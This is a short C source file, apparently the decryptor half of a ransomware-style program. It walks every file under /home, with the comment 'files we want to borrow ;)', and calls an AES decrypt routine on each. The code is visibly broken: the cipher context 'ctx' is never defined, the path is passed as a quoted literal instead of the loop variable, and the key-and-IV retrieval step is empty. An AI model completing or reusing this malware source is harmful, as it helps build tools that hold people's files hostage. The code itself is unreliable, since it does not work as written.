#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "lib/aes.h"

#include "files.h"
#include "encryption.h"

int main(int argc, char *argv[]){
    //Retrieve key and IV


    //List all the files we want to borrow ;)
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Decrypt each file with AES
        decryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);
}